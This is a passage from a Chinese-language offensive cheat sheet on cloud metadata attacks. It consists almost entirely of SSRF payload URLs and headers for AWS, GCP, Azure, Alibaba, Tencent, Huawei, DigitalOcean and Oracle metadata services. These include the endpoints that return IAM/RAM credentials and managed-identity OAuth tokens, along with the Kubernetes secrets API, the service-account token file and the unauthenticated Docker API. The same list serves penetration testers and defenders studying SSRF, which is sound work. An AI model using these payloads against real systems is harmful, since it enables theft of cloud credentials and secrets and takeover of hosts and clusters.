## 四、云元数据攻击

### 4.1 AWS
```
# AWS实例元数据（IMDSv1）
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[RoleName]
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/dynamic/instance-identity/document

# IMDSv2（需先获取token）
# PUT http://169.254.169.254/latest/api/token （X-aws-ec2-metadata-token-ttl-seconds: 21600）
# GET http://169.254.169.254/latest/meta-data/ （X-aws-ec2-metadata-token: <token>）

# AWS ECS
http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# AWS EKS Pod身份
http://169.254.170.23/

# AWS Lambda
http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next
```

### 4.2 Google Cloud (GCP)
```
# GCP元数据（需Metadata-Flavor: Google头）
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/
# 必须带Header: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### 4.3 Microsoft Azure
```
# Azure元数据（需Metadata: true头）
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Header: Metadata: true
```

### 4.4 阿里云
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/user-data

# 阿里云ECS RAM角色
http://100.100.100.200/latest/meta-data/ram/security-credentials/[RoleName]
# 返回AccessKeyId/AccessKeySecret/SecurityToken
```

### 4.5 腾讯云
```
http://metadata.tencentyun.com/latest/meta-data/
http://metadata.tencentyun.com/latest/meta-data/placement/region
http://metadata.tencentyun.com/latest/meta-data/local-ipv4
```

### 4.6 华为云
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/openstack/latest/meta_data.json
```

### 4.7 其他云/平台
```
# Kubernetes API Server
https://kubernetes.default.svc/api/v1/namespaces/default/secrets
https://kubernetes.default.svc/
https://kubernetes/
# Service Account Token
/var/run/secrets/kubernetes.io/serviceaccount/token

# Docker API
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/containers/create
http://127.0.0.1:2376/   （TLS Docker）

# DigitalOcean
http://169.254.169.254/metadata/v1.json

# Oracle Cloud
http://169.254.169.254/opc/v1/instance/
```

